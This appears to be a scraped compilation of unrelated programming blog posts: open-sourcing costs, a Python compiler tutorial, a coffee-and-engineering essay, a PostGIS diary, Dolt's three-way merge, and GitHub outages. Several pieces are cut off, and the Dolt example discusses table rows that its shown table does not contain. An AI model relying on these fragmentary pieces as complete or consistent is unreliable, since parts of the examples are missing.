<li><span data-preserver-spaces="true">Any change in ownership requires people to make decisions and take action. Doing so requires more time than it takes to open a repository, copy some files, and push the commit. Time takes money, and so has a cost to the company.</span></li>
<li><span data-preserver-spaces="true">The code must first be checked for the risk of revealing any potential security holes. Detailed code reviews take time from experts, and so aren’t free.</span>If the released code risked showing a potential vulnerability to existing users of the software, that’s something the company will need to address. It might be easier/cheaper not to release the code.</li>
<li><span data-preserver-spaces="true">The code must first be reviewed for IP and licensing issues. Does the company want all the code released under an open-source license? If not all of the source code (and assets) can/should be released, what should they do about the parts that can’t?</span>Or what if the code depends on libraries or other licensed resources from elsewhere?</li>
<li><span data-preserver-spaces="true">The ongoing management of an open-source project takes time (and therefore money.) If the intention is to create an ongoing, community-driven project, it will need (at least initially) some leadership and guidance. Releasing the code under an opensource license and then leaving it for anyone to do with it as they wish, is less likely to lead to a single release that continues the legacy of the original.</span></li>
<li><span data-preserver-spaces="true">If releasing the code for use as anyone wishes, then pre-existing branding, trademarks, names, etc. must be removed or changed. If not performing such modifications before the code is released, it may be necessary to verify that anything released based on the original source has such identifying elements removed.&nbsp;</span></li>
</ul>


<br>


<p><span data-preserver-spaces="true">“Cost nothing” is not the same as “won’t cost much.” If you’re trying to persuade someone to do something, being specific, and understanding what matters to them and how they make decisions can help build a persuasive argument.</span></p>



<p>
An additional nod to Sébastien for pointing me to this explanation of <a href="https://www.hanselman.com/blog/AnnouncingOpenLiveWriterAnOpenSourceForkOfWindowsLiveWriter.aspx">turning Windows Live Writer into Open Live Writer</a> as an example of the steps/processes involved that must have cost effort/time/money.</p>

<br><h3>Let's make a Teeny Tiny compiler, part 1</h3><p><small>5/5/2020</small></p><p>

<img src="http://austinhenley.com/blog/images/knightdragon.jpg"></p><p><i>This is the first post in a three part series. Check out <a href="http://web.eecs.utk.edu/~azh/blog/teenytinycompiler2.html">part 2</a> and <a href="http://web.eecs.utk.edu/~azh/blog/teenytinycompiler3.html">part 3</a> when you are ready.</i></p>

<p>It is a beautiful day outside, so let's make a compiler. You don't need any knowledge of how compilers work to follow along. We are going to use Python to implement our own programming language, Teeny Tiny, that will compile to C code. It will take about 500 lines of code and provide the initial infrastructure needed to customize and extend the compiler into your own billion dollar production-ready compiler.</p>

<p>This tutorial is a series of posts that go step by step in building a working compiler. All of the source code can be found in the GitHub <a href="https://github.com/AZHenley/teenytinycompiler">repo</a>. If you follow along with all the posts, I guesstimate that it will take you only a few hours.

</p><p>The Teeny Tiny language we are going to implement is a dialect of <a href="https://en.wikipedia.org/wiki/BASIC">BASIC</a>. The syntax is clean and simple. If you prefer a <a href="https://en.wikipedia.org/wiki/C_(programming_language)">C</a>-like syntax then it will be trivial to modify the compiler at the end.  Here is an example program in our Teeny Tiny language:</p>

<pre>PRINT "How many fibonacci numbers do you want?"
INPUT nums

LET a = 0
LET b = 1
WHILE nums &gt; 0 REPEAT
    PRINT a
    LET c = a + b
    LET a = b
    LET b = c
    LET nums = nums - 1
ENDWHILE	
</pre>

<p>This program prints out terms of the fibonacci sequence based on the user's input: 0 1 1 2 3 5 13...</p>

<p>Our language will allow a variety of the basic operations that you'd expect from a programming language. In particular, it will support:</p>

<ul>
	<li>Numerical variables</li>
	<li>Basic arithmetic</li>
	<li>If statements</li>
	<li>While loops</li>
	<li>Print text and numbers</li>
	<li>Input numbers</li>
	<li>Labels and goto</li>
	<li>Comments</li>
</ul>

<p>Although this is a standard subset of features, you may notice that there are no functions, no arrays, no way to read/write from a file, and not even an else statement. But with just this small set of constructs, you can actually do a lot. It will also setup the compiler in such a way that many other features will be straight forward to add later.</p>

<h4>Compiler Overview</h4>

<p><img src="http://austinhenley.com/blog/images/compilersteps.png"></p><p>Our compiler will follow a three step process that is illustrated above. First, given the inputted source code, it will break the code up into <i>tokens</i>. These are like words and punctuation in English. Second, it will <i>parse</i> the tokens to make sure they are in an order that is allowed in our language. Just like English sentences follow specific structures of verbs and nouns. Third, it will <i>emit</i> the C code that our language will translate to.</p>

<p>We will use these three steps as the main organization for our code. The lexer, parser, and emitter will each have their own Python code file. This tutorial is broken up into 3 parts based on these steps as well. If you were to extend the compiler, there are some additional steps you would add, but we will hold off on discussing those.</p>



<h4>Lexer Overview</h4>

<p>The first module of our compiler is called the <i>lexer</i>. Given a string of Teeny Tiny code, it will iterate character by character to do two things: decide where each token starts/stops and what type of token it is. If the lexer is unable to do this, then it will report an error for an invalid token.</p>

<p><img src="http://austinhenley.com/blog/images/tokens.png"></p><p>The figure demonstrates an example input and output of the lexer. Given the Teeny Tiny code, the lexer must determine where the tokens are along with the type (e.g., keyword). You can see that spaces aren't recognized as tokens, but the lexer will use them as one way to know when a token ends.</p>

<p>Let's finally get into some code, starting with the structure of the lexer in the file <b>lex.py</b>:</p>

<pre>class Lexer:
    def __init__(self, input):
        pass

    # Process the next character.
    def nextChar(self):
        pass

    # Return the lookahead character.
    def peek(self):
        pass

    # Invalid token found, print error message and exit.
    def abort(self, message):
        pass
		
    # Skip whitespace except newlines, which we will use to indicate the end of a statement.
    def skipWhitespace(self):
        pass
		
    # Skip comments in the code.
    def skipComment(self):
        pass

    # Return the next token.
    def getToken(self):
        pass
</pre>

<p>I like to sketch out all the functions that I think I will need, then go back and fill them in. The function <b>getToken</b> will be the meat of the lexer. It will be called each time the compiler is ready for the next token and it will do the work of classifying tokens. <b>nextChar</b> and <b>peek</b> are helper functions for looking at the next character. <b>skipWhitespace</b> consumes the spaces and tabs that we don't care about. <b>abort</b> is what we will use to report an invalid token.</p>

<p>The lexer needs to keep track of the current position in the input string and the character at that position. We will initialize these in the constructor:</p>

<pre>    def __init__(self, input):
        self.source = input + '\n' # Source code to lex as a string. Append a newline to simplify lexing/parsing the last token/statement.
        self.curChar = ''   # Current character in the string.
        self.curPos = -1    # Current position in the string.
        self.nextChar()
</pre>

<p>The lexer needs the input code and we append a newline to it (this just simplifies some checks later on). <b>curChar</b> is what the lexer will constantly check to decide what kind of token it is. Why not just do <i>source[curPos]</i>? Because that would litter the code with bounds checking. Instead we do this in <b>nextChar</b>:</p>

<pre>    # Process the next character.
    def nextChar(self):
        self.curPos += 1
        if self.curPos &gt;= len(self.source):
            self.curChar = '\0'  # EOF
        else:
            self.curChar = self.source[self.curPos]
</pre>

<p>This increments the lexer's current position and updates the current character. If we reach the end of the input, set the character to the end-of-file marker. This is the only place we will modify curPos and curChar. But sometimes we want to look ahead to the next character without updating curPos:</p>

<pre>    # Return the lookahead character.
    def peek(self):
        if self.curPos + 1 &gt;= len(self.source):
            return '\0'
        return self.source[self.curPos+1]
</pre>

<p>We should make sure these functions work. Let's test them by create a new file <b>teenytiny.py</b>:</p>

<pre>from lex import *

def main():
	input = "LET foobar = 123"
	lexer = Lexer(input)

	while lexer.peek() != '\0':
		print(lexer.curChar)
		lexer.nextChar()

main()
</pre>

<p>Run this and the output should be every character of the input string, <i>LET foobar = 123</i>, on a new line:</p>

<pre>L
E 
T 

f 
o 
o 
b 
a 
r 

= 

1 
2 
3 

</pre>

<h4>Classifying Tokens</h4>

<p>But we don't just want characters, we want tokens! We need to plan how combining individual characters together makes a token, which works much like a state machine. Here are the main lexer rules for the Teeny Tiny language:</p>

<ul>
	<li>Operator. One or two consecutive characters that matches: + - * / = == != &gt; &lt; &gt;= &lt;=</li>
	<li>String. Double quotation followed by zero or more characters and a double quotation. Such as: "hello, world!" and ""</li>
	<li>Number. One or more numeric characters followed by an optional decimal point and one or more numeric characters. Such as: 15 and 3.14</li>
	<li>Identifier. An alphabetical character followed by zero or more alphanumeric characters.</li>
	<li>Keyword. Exact text match of: LABEL, GOTO, PRINT, INPUT, LET, IF, THEN, ENDIF, WHILE, REPEAT, ENDWHILE</li>
</ul>

<p>Next we will start our <b>getToken</b> function in our <b>Lexer</b> class:</p>

<pre>    # Return the next token.
    def getToken(self):
        # Check the first character of this token to see if we can decide what it is.
        # If it is a multiple character operator (e.g., !=), number, identifier, or keyword then we will process the rest.
        if self.curChar == '+':
            pass	# Plus token.
        elif self.curChar == '-':
            pass	# Minus token.
        elif self.curChar == '*':
            pass	# Asterisk token.
        elif self.curChar == '/':
            pass	# Slash token.
        elif self.curChar == '\n':
            pass	# Newline token.
        elif self.curChar == '\0':
            pass	# EOF token.
        else:
            # Unknown token!
            pass
			
        self.nextChar()
</pre>

<p>This will detect a few possible tokens, but doesn't do anything useful yet. What we need next is a <b>Token</b> class to keep track of what type of token it is and the exact text from the code. Place this in <b>Lex.py</b> for now:</p>

<pre># Token contains the original text and the type of token.
class Token:   
    def __init__(self, tokenText, tokenKind):
        self.text = tokenText   # The token's actual text. Used for identifiers, strings, and numbers.
        self.kind = tokenKind   # The TokenType that this token is classified as.
</pre>

<p>To specify what type a token is, we will create the <b>TokenType</b> class as an enum. It looks long, but it just specifies every possible token our language allows. Add <i>import enum</i> to the top of <b>Lex.py</b> and add this class:</p>

<pre># TokenType is our enum for all the types of tokens.
class TokenType(enum.Enum):
	EOF = -1
	NEWLINE = 0
	NUMBER = 1
	IDENT = 2
	STRING = 3
	# Keywords.
	LABEL = 101
	GOTO = 102
	PRINT = 103
	INPUT = 104
	LET = 105
	IF = 106
	THEN = 107
	ENDIF = 108
	WHILE = 109
	REPEAT = 110
	ENDWHILE = 111
	# Operators.
	EQ = 201  
	PLUS = 202
	MINUS = 203
	ASTERISK = 204
	SLASH = 205
	EQEQ = 206
	NOTEQ = 207
	LT = 208
	LTEQ = 209
	GT = 210
	GTEQ = 211
</pre>

<p>Now we can expand <b>getToken</b> to actually do something when it detects a specific token:</p>

<pre>    # Return the next token.
    def getToken(self):
        token = None

        # Check the first character of this token to see if we can decide what it is.
        # If it is a multiple character operator (e.g., !=), number, identifier, or keyword then we will process the rest.
        if self.curChar == '+':
            token = Token(self.curChar, TokenType.PLUS)
        elif self.curChar == '-':
            token = Token(self.curChar, TokenType.MINUS)
        elif self.curChar == '*':
            token = Token(self.curChar, TokenType.ASTERISK)
        elif self.curChar == '/':
            token = Token(self.curChar, TokenType.SLASH)
        elif self.curChar == '\n':
            token = …</pre></div></div></div>

<p>A programmer saying they love coffee must be a cliché at this point, but I am guilty as charged: I love coffee.</p>



<p>As Ireland started to ease its lockdown and things are opening up, I finally had a chance to take a barista course. That was something I’d wanted to do for many years.</p>



<p>After gaining insight into the processes that happen at a coffee shop, I couldn’t help but trace parallels to what we do as software engineers.  That’s what I want to talk about today.</p>



<h2>Prep work</h2>



<p>We started our session going over what needs to happen before you start making coffee.</p>



<p>You start by calibrating the grinders, trying to find the coarseness that will let you pull an espresso shot to perfect. Once you have it, you move to to set the grinders with the correct timing to give you the right amount of coffee for a double shot.</p>



<p>Skip all that and you’ll get (at best) subpar coffee that won’t make your customers happy.</p>



<p>I find this similar to the work we do before embarking on a project. Gathering the requirements, sketching out what the system should look like, defining service-level indicators (SLIs) and objectives (SLOs), etc, are all part of the prep work we do as engineers.</p>



<p>Planning before starting the work enables us to assess the risks and put our projects in a better position to succeed. </p>



<h2>Balance</h2>



<p>After we learn about the prep work, our instructor went over the espresso brewing process. If you brew it for too short a period, the coffee comes out too acidic. Brew it for too long and it comes out too bitter. There’s a fine balance between those two extremes that gives you perfect coffee.</p>



<p>The same applies to software.</p>



<p>If you under-engineer a system, you might find yourself in trouble when requirements change or demand increases. The lack of planning will result in pain points when it’s time to make the project scale.</p>



<p>On the other hand, an over-engineered system can become a nightmare to understand and maintain. Changes become difficult and sometimes (most of the time?) lead to unexpected results.</p>



<p>Finding balance is not easy, but it’s needed to achieve great software. </p>



<h2>Clean up</h2>



<p>One of the things our instructor mentioned was clean up.</p>



<p>As you go about making lattes, spillage will happen. Too much of that and your workspace becomes a mess, you become less effective at preparing the orders and everything feels terrible.</p>



<p>That’s why clean up is important. From time to time, he said, you have to stop and clean up the area so you can keep working.</p>



<p>I relate this to what we call <strong>tech debt</strong> in software development. As projects go on and deadlines grow tighter, we cut corners and sometimes make poor decisions that leave our code base in a bad state.</p>



<p>Tech debt is not inherently bad. Just like a coffee shop has to accept some untidiness to get the orders going, so does software development. Sometimes it’s needed and the right thing to do.</p>



<p>That untidiness only becomes a real problem when we take too long to clean it up. When the debt is not repaid, work becomes difficult. Tasks that should be simple take longer to complete.</p>



<p>Just like the coffee shop needs periodic cleaning, so do our code bases.</p>



<h2>Conclusion</h2>



<p>Although this posts draws parallels to software engineering topics, I’m sure you can see similarities to other areas as well.</p>



<p>I hope you found this post interesting, and that it helped you stop and think deeper about our craft. Or, if anything, I hope it makes you appreciate the work that’s put into your lattes a bit more!</p>

  <p><span>11 Jun 2020</span></p><p>Have you ever watched a team of five-year-olds play soccer? The way the mass of children chases the ball around in a group? I think programmers do that too.</p>

<p><img src="http://blog.cleverelephant.ca/images//2020/youth-soccer.jpg" alt="Get the ball!"></p>

<p>There’s something about working on a problem together that is so much more rewarding than working separately, we cannot help but get drawn into other peoples problems. There’s a lot of gratification to be had in finding a solution to a shared difficulty!</p>

<p>Even better, different people bring different perspectives to a problem, and illuminate different areas of improvement.</p>

<h2 id="maximum-inscribed-circle">Maximum Inscribed Circle</h2>

<p>A couple months ago, my colleague <a href="https://www.linkedin.com/in/mrmartindavis">Martin Davis</a> committed a pair of new routines into JTS, to <a href="http://lin-ear-th-inking.blogspot.com/2020/04/maximum-inscribed-circle-and-largest.html">calculate the largest circles</a> that can fit inside a polygon or in a collection of geometries.</p>

<p><img src="http://blog.cleverelephant.ca/images//2020/canada_mic.png" alt="Maximum Inscribed Circle"></p>

<p>We want to bring all the algorithmic goodness of JTS to PostGIS, so I took up the first step, and <a href="https://github.com/libgeos/geos/commit/0909042df5f8d4b9ae1832b3fd67713e206057fb">ported “maximum inscribed circle” to GEOS</a> and <a href="https://github.com/postgis/postgis/commit/b5bd6836d4617ebc924e804c42b60de637a94f60">to PostGIS</a>.</p>

<p>When I ported the GEOS test cases, I turned up some odd performance problems. The calculation seemed to be taking inordinately long for larger inputs. What was going on?</p>

<p>The “maximum inscribed circle” algorithm leans heavily on a routine called <a href="https://github.com/libgeos/geos/blob/1357b728c30c6008d6d4fafba158f0cee71f3e9d/src/operation/distance/IndexedFacetDistance.cpp">IndexedFacetDistance</a> to calculate distances between polygon boundaries and candidate circle-centers while converging on the “maximum inscribed circle”. If that routine is slow, the whole algorithm will be slow.</p>

<p>Dan Baston, who originally ported the “IndexedFacetDistance” class got interested and started looking at some test cases of his own.</p>

<p>He found he could improve his old implementation using <a href="https://github.com/libgeos/geos/commit/1357b728c30c6008d6d4fafba158f0cee71f3e9d">better memory management</a> that he’d learned in the meantime. He also found <a href="https://github.com/libgeos/geos/pull/314">some short-circuits</a> to envelope distance calculation that improved performance quite a bit.</p>

<p>In fact, they improved performance so much that Martin <a href="https://github.com/locationtech/jts/pull/534">ported them back to JTS</a>, where he found that for some cases he could log a <strong>10x performance</strong> in distance calculations.</p>

<p>There’s something alchemical about the whole thing.</p>

<ul>
  <li>There was a bunch of long-standing code nobody was looking at.</li>
  <li>I ported an unrelated algorithm which exercised that code.</li>
  <li>I wrote a test case and reported some profiling information.</li>
  <li>Other folks with more knowledge were intrigued.</li>
  <li>They fed their knowledge back and forth and developed more tests.</li>
  <li>Improvements were found that made everything faster.</li>
</ul>

<p>I did nothing except shine a light in a dark hole, and everyone else got very excited and things happened.</p>

<h2 id="toast-caching-redux">Toast Caching Redux</h2>

<p>In a similar vein, as I described in my <a href="http://blog.cleverelephant.ca/2020/04/developer-life.html">last diary entry</a>, a long-standing performance issue in PostGIS was the repeated reading of large geometries during spatial joins.</p>

<p>Much of the problem was solved by dropping a very small “<a href="https://github.com/postgis/postgis/commit/8b548a4697490b7e45508b91cb340eb79b424a92">TOAST cache</a>” into the process by which PostGIS reads geometries in functions frequently used in spatial joins.</p>

<p><img src="http://blog.cleverelephant.ca/images//2020/facepalm.gif" alt="TOAST"></p>

<p>I was so happy with the improvement the TOAST cache provided that I just stopped. Fortunately, my fellow PostGIS community member <a href="https://github.com/Algunenano">Raúl Marín</a> was more stubborn.</p>

<p>Having seen my commit of the TOAST cache, and having done some work in other caching parts of PostGIS, he took up the challenge and <a href="https://github.com/postgis/postgis/commit/10c9dc2ac242c194763a47edab2b2487b42eb3a6">integrated the TOAST cache with the existing index caches</a>.</p>

<p>The integrated system now uses TOAST identifiers to note identical repeated inputs and avoid both unneccessary reads off disk and unncessary cache checks of the index cache.</p>

<p>The result is that, for spatial joins over large objects, PostGIS 3.1 will be as much as 60x faster than the performance in PostGIS 3.0.</p>

<p>I prepared a demo for a bid proposal this week and found that an example query that took <strong>800ms</strong> on my laptop took a <strong>full minute</strong> on the beefy 16-core demo server. What had I done wrong? Ah! My laptop is running the <strong>latest</strong> PostGIS code (which will become 3.1) while the cloud server was running PostGIS <strong>2.4</strong>. Mystery solved!</p>

<h2 id="port-port-port">Port, Port, Port</h2>

<p>I may have <a href="http://blog.cleverelephant.ca/2020/04/developer-life.html">mentioned</a> that I’m not a very good programmer.</p>

<p>My current task is definitely exercising my imposter syndrome: porting Martin’s <a href="http://lin-ear-th-inking.blogspot.com/2020/05/jts-overlay-next-generation.html">new overlay code</a> from JTS to GEOS.</p>

<p>I knew it would take a long time, and I knew it would be a challenge; but knowing and experiencing are quite different things.</p>

<p>The challenges, as I’ve experienced them are:</p>

<ul>
  <li>Moving from Java’s garbage collected memory model to C++’s managed memory model means that I have to understand the object life-cycle which is <strong>implicit</strong> in Java and make it <strong>explicit</strong> in C++, all while avoiding accidentally introducing a lot of memory churn and data copying into the GEOS port. Porting isn’t a simple matter of transcribing and papering over syntactic idiom, it involves first understanding the actual JTS algorithms.</li>
  <li>The age of the GEOS code base, and number of contributors over time, mean that there are a huge number of different patterns to potentially follow in trying to make a “consistent” port to GEOS. Porting isn’t a matter of blank-slate implementation of the JTS code – the ported GEOS code has to slot into the <strong>existing</strong> GEOS layout. So I have to spend a lot of time learning how previous implementations chose to handle life cycles and call patterns (pass reference, or pointer? yes. Return value? or void return and output parameter? also yes.)</li>
  <li>My lack of C++ idiom means I spend an excessive amount of time looking up core functions and methods associated with them. This is the only place I’ve felt myself measurably get better over the past weeks.</li>
</ul>

<p>I’m still only just getting started, having ported some core data structures, and little pieces of dependencies that the overlay needs. The reward will be a hugely improved overlay code for GEOS and thus PostGIS, but I anticipate the debugging stage of the port will take quite a while, even when the code is largely complete.</p>

<p>Wish me luck, I’m going to need it!</p>

<p>If you would like to test the new JTS overlay code, it resides on <a href="https://github.com/dr-jts/jts/tree/overlay-sr">this branch</a>. <br>If you would like to watch me suffer as I work on the port, the GEOS branch is <a href="https://github.com/libgeos/geos/tree/overlay-sr">here</a>.</p>

<![CDATA[Cell-level Three-way Merge in Dolt]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://github.com/liquidata-inc/dolt">Dolt</a> is a SQL database with Git-like
functionality. It supports version control primitives including commit,
branch, merge, clone, push and pull. This is the fourth post in a series
exploring how Dolt stores table data implements these version control
primitives. Previously, we looked at <a href="https://www.dolthub.com/blog/2020-04-01-how-dolt-stores-table-data/">the content-addressed sorted index
structure</a> underlying Dolt's table
storage, called a Prolly-tree.  In the second post, I explained <a href="https://www.dolthub.com/blog/2020-05-13-dolt-commit-graph-and-structural-sharing/">the Dolt
commit graph</a> and how
table storage in Dolt is shared across revisions of the table.  In our last
post, we talked about <a href="https://www.dolthub.com/blog/2020-06-16-efficient-diff-on-prolly-trees/">implementing diff efficiently on top of
Prolly-trees</a>.</p>
<p>In this post, we're going to look at how Dolt implements <code>merge</code> by using a
cell-level three-way merge algorithm.</p>

<p>Merge is a fundamental operation in (D)VCS and finding a way to do effective
merges of source files in version control systems is what allowed VCS
implementations to move away from file locking and into a workflow where
multiple people can work on the same files at the same time.</p>
<p>A merge takes two divergent revisions of a source document which are created
by two divergent histories of changes to that document and produces a new
document that includes all the changes from both histories. In the context of
Dolt where the "source document" is the value of the database at a commit, the
fundamental operation is something like <code>newDatabaseValue :=
Merge(intoDatabaseValue, fromDatabaseValue)</code>.</p>
<p>The fundamental question is how to construct the <code>newDatabaseValue</code> given the
two database values which should be merged. There have been numerous solutions
to this problem in a variety of contexts, including collaborative file
editing, databases and version control systems. Dolt takes its approach to
merges from Git, and it implements a traditional algorithm from VCS, a
three-way merge.</p>

<p>A three-way merge works in the context of the commit graph and a recorded and
available history for how the database came to have <code>intoDatabaseValue</code> and
<code>fromDatabaseValue</code>. It builds on top of <code>diff</code>, which was explained in
<a href="https://www.dolthub.com/blog/2020-06-16-efficient-diff-on-prolly-trees/">my previous blog post</a> and it
works on three independent commits:</p>
<ul>
<li><strong>into</strong>—The head of the branch being merged into. Often something like <code>main</code>.</li>
<li><strong>from</strong>—The head of the branch being merged from. Often a feature branch.</li>
<li><strong>ancestor</strong>—The nearest common ancestor of <strong>into</strong> and <strong>from</strong>.</li>
</ul>
<p>On a Dolt commit graph, with the commits pointing to their parents, this looks
something like:</p>
<p><span>

    <span></span>
  <img alt="merge commit graph" title="merge commit graph" src="https://www.dolthub.com/blog/static/a10faf8b5fe1f4329112153f729fabfc/72799/merge-commit-graph.png" srcset="https://www.dolthub.com/blog/static/a10faf8b5fe1f4329112153f729fabfc/a48b3/merge-commit-graph.png 214w,

  </a>
    </span></p>
<p>When running <code>dolt merge</code>, <strong>into</strong> and <strong>from</strong> are explicit based on the
working directory and the CLI invocation. <strong>into</strong> comes from the branch that
is currently checked out in the working directory. <strong>from</strong> comes from the
commit that is supplied on the command line. But <strong>ancestor</strong> is based on the
repository state and relationship between <strong>into</strong> and <strong>from</strong>. It is found
automatically by inspecting the parents of <strong>into</strong> and <strong>from</strong>.</p>
<p>The nearest common ancestor is the ancestor where the commits most recently
diverged from each other.<sup id="fnref-1"><a href="#fn-1">1</a></sup> We find this commit by walking the parents of
<strong>into</strong> and <strong>from</strong> in breadth-first order until we find a common
commit.</p>
<h2>Diffs and Finding Conflicts</h2>
<p>The fundamental observation of three-way merge is that if we look at all the
changes between <strong>ancestor</strong> and <strong>into</strong> and all the changes between
<strong>ancestor</strong> and <strong>from</strong>, that is the set of changes that should appear in
the value that results from the merge of <strong>into</strong> and <strong>from</strong>.</p>
<p><code>Diff(ancestor, into)</code> defines all the changes that have occured on <strong>into</strong>
since it diverged from its common ancestor with <strong>from</strong>. And symmetrically,
<code>Diff(ancestor, from)</code> defines all the chages that have occurred on <strong>from</strong>
since it diverged from its common ancestor with <strong>into</strong>. If all of those
changes are reflected in the database value resulting from <code>Merge(into,
from)</code>, the value will be the one we want.</p>
<p>Dolt does this by merging the diffs by primary key on table data for each
table in the database. After finding the commit <strong>ancestor</strong>, it streams
<code>Diff(ancestor, into)</code> and <code>Diff(ancestor, from)</code>. It visits differences in
primary key order using a merging iterator of the two diffs.</p>
<ol>
<li>If <code>Into.Key &lt; From.Key</code>: the value for the row in <code>into</code> is the right
value in the output.</li>
<li>If <code>Into.Key &gt; From.Key</code>: the value for the row in <code>from</code> is the right
value in the output.</li>
<li>If <code>Into.Key == From.Key &amp;&amp; Into.Value == From.Value</code>: the same change was
made in <code>into</code> and <code>from</code> and there is no conflict. The value of the row is as
it is in <code>into</code> and <code>from</code>.</li>
<li>Otherwise, <code>Into.Key == From.Key</code>, but the rows are not identical. In this
case, Dolt falls back to cell-level merge of the rows.</li>
</ol>
<p>A cell-level merge means that the merged value for that row is not a conflict
if the changes didn't touch the same columns. Specifically:</p>
<ul>
<li>If one of the changes is a delete and the other is not, then there is a
conflict.</li>
<li>If, for any column α in the table, <code>into</code> changes the value of column
α to be χ, and <code>from</code> of the changes the value of column α to
be γ, where χ is not equal to γ, then there is a conflict</li>
<li>Otherwise, the value of the row in the merged output is equal to the value
of the row as it appears in <strong>ancestor</strong>, with all of the column mutations in
<strong>into</strong> applied to it and all of the column mutations in <strong>from</strong> applied to
it.</li>
</ul>
<p>Here's an example of the two diffs merge might be operating on:</p>
<div>
<pre>+-----+------------+------------+------------+        +-----+------------+------------+------------+
|     | name       | population | capital    |        |     | name       | population | capital    |
+-----+------------+------------+------------+        +-----+------------+------------+------------+
|  <span>+</span>  | <span>california</span> | <span>39510000</span>   | <span>sacramento</span> |        |  <span>+</span>  | <span>new york</span>   | <span>19378102</span>   | <span>albany</span>     |

|  <span>-</span>  | <span>usa</span>        | <span>328000000</span>  | <span>dc</span>         |        |  <span>-</span>  | <span>usa</span>        | <span>328000000</span>  | <span>dc</span>         |

+-----+------------+------------+------------+        +-----+------------+------------+------------+
</pre>
</div>
<p>In this example, <code>california</code> will be covered by case #1, <code>new york</code>
by case #2, and <code>usa</code> by case #3. <code>texas</code>, because it is modified in
both branches and has a conflicting column value, will end up as a
conflict in case #4. <code>vermont</code> will also be handled by case #4, but
because the two branches modified different columns, there will be no
conflict. The resulting row will reflect both changes: a population of
623,989 and a capital of Montpelier.</p>
<p>In reality, when implementing the above algorithm, Dolt is operating on an
editor for the table data in <strong>into</strong>, not <strong>ancestor</strong>. Thus, Dolt skips over
entries matching step 1 and 3, it applies all the diffs matching step 2 to the
current table value, and it applies the cell-level diffs on non-conflicting
changes matching step 4 only from <code>from</code>.</p>
<p>Dolt's three-way merge works great in the case that the two divergent
histories work on independent parts of the database. But if they both update
portions of the database with conflicting values, then it fails to produce a
database value that incorporates both sets of changes. Instead, it falls back
to producing <code>conflicts</code> and it leaves it up to the user to resolve conflicts
and get the database into a state that reflects both sets of changes.</p>
<h2>Representing Conflicts</h2>
<p>The result of the merge algorithm is a new table value for the table in the
working set plus a possibly empty set of conflicting rows which could not be
merged successfully.  Conflicts in Dolt are always on a row in a table. The
primary key is the same between <strong>into</strong> and <strong>from</strong>, but the values for at
least one column in the row were different between the two commits and that
column's value was changed by both histories since <strong>ancestor</strong>.</p>
<p>Conflicts in Dolt are stored by primary key along-side the table data for the
table, in a separate Prolly-tree from the table data itself. Each row in the
conflicts Prolly-tree stores the value of the row as it appeared in all three
commits involved in the merge: <strong>into</strong>, <strong>from</strong> and <strong>ancestor</strong> . This
allows for programmatic resolution strategies to see the relevant row-related
data if necessary.</p>
<p>Conflicts after a merge can be resolved one-by-one, by setting the row to a
certain value and removing the conflict from the conflicts row data.  Dolt also
has built-in bulk resolution strategies, such as take-ours and take-theirs.
For example, to merge a feature branch into your current working branch and
overwrite all conflicts back to their values as they are in your current
working branch, you an do:</p>
<div data-language="sh"><pre><code>$ dolt merge feature-branch
$ dolt conflicts resolve --ours table_with_conflicts</code></pre></div>
<p>Currently Dolt considers any table that has unresolved conflicts in its
conflicts Map to be unmerged and it will not allow a commit to be created with
any unmerged table values. That means that table values that carry conflicts
cannot appear in commits. This is a small divergence from git, which places the
conflicts as textual markers directly in the working tree (if those files are
text files) and will allow files with conflict markers to be staged for commit
with something like <code>git add -f</code>.</p>

<p>We took a quick look at how three-way merge works and saw that it applies very
naturally to table data as Dolt represents it. While a cell-level three-way
merge isn't the most natural fit for every database merge use case, we think
it's a really good starting point for human scale databases that have
feature-level collaboration. That being said, this space is one corner of Dolt
that's ripe for innovation, and we hope to see a lot of feature work here in
the future. Some things we would to implement include:</p>
<ul>
<li>Recursive three-way merge, for when a nearest common ancestor is not
uniquely defined.</li>
<li>A larger suite of conflict resolution strategies, potentially building on
type-specific merge-lattices from CRDTs for example.</li>
<li>A larger suite of conflict …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>If you're looking for a more reasoned argumentation, see Update 3 at the bottom.</em></p>
<p>I rarely interact with <a href="https://github.com/">Github</a> anymore. All my projects are either on my selfhosted <a href="https://gitea.io/">Gitea</a> instance or on <a href="https://codeberg.org/">Codeberg.org</a>. That's why I missed the following on <a href="https://www.githubstatus.com/">Github Status</a>:</p>
<p><img src="https://yarmo.eu/content/img/github_status.png" alt="Github status shows a lot of downtimes"><br>
<em>Yikes</em></p>
<p>Yikes, indeed. How everyone handles this is up to them. Large projects will find it hard to move, no doubt.</p>
<p>My interpretation? The Microsoft Github ship is sinking and it's sinking faster every day. The beauty is: you don't need them. Instead of relying on Github, you could:</p>
<ul>
<li>selfhost your own <a href="https://gitea.io/">Gitea</a> instance if you have the knowledge;</li>
<li>use <a href="https://codeberg.org/">Codeberg.org</a> which also uses <a href="https://gitea.io/">Gitea</a>;</li>
<li>use <a href="https://sourcehut.org/">sourcehut.org</a> which takes a different but very solid approach to git hosting;</li>
<li>use any instance generously hosted by amazing people (think <a href="https://libreho.st/">libreho.st</a> and <a href="https://chatons.org/">Chatons</a>);</li>
<li>use <a href="https://gitlab.com/">gitlab.com</a> or selfhost an instance.</li>
</ul>
<p>There are so many better places to be for git hosting nowadays. For an easy performance comparison of different services, see <a href="https://forgeperf.org/">forgeperf.org</a>.</p>
<p>Abandon the corporate ship before or after it sinks, up to you.</p>

<h2>Update 1</h2>
<p>Added <a href="https://forgeperf.org/">forgeperf.org</a> link after suggestion by <a href="https://mstdn.io/@slow">@slow@mstdn.io</a>.</p>

<h2>Update 2</h2>
<p>Added <a href="https://sourcehut.org/">sourcehut.org</a> link after suggestion by <a href="https://social.privacytools.io/@freddyym">@freddyym@social.privacytools.io</a>.</p>
<hr>
<h2>Update 3</h2>
<p>Don't publish on your website when you are feeling frustrated; that's what Twitter is for.</p>
<p>Let's inject some reason here. Github isn't dying anytime soon. Certainly not due to this number of outages. And all software breaks, so that's no measure; what matters is the response. And Github is on it. Like every single other time it was broken.</p>
<p>But that doesn't mean we can't change the status quo. Almost every defense of Github comes down to discoverability: if I put my project on Github, others will find it. If I put it elsewhere, other won't find it.</p>
<p>Do not forget: Github's discoverability comes from us, the userbase. We the developers make or break Github. If we all move, Github shuts its doors. This won't happen. But look at the landscape: so many alternative solutions exist, Github is no better than any other service and, in the eyes of some, me included, Github may actually provide a worse experience than most alternatives.</p>
